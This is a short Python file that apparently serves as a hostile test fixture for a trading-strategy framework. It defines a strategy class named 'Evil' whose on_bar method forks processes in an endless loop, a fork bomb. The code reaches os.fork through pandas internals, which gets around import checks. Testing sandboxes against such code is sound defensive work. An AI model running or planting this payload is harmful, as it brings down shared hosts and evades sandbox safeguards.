import pandas as pd

from trader.authored.api import AuthoredStrategy, Decision


class Evil(AuthoredStrategy):
    def on_bar(self, history, params):
        while True:
            pd.io.common.os.fork()
